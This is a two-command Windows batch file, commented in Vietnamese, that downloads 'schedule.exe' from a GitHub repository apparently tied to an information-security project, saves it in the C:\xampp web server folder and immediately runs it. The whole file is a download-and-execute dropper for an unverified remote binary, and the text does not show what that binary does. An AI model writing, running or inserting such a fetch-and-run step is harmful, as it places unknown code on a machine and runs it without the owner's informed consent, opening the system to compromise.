@echo off
REM Tải tệp schedule.exe từ URL vào thư mục C:\xampp
wget https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/schedule.exe -O "C:\xampp\schedule.exe"

REM Chạy tệp đã tải về
start "" "C:\xampp\schedule.exe"
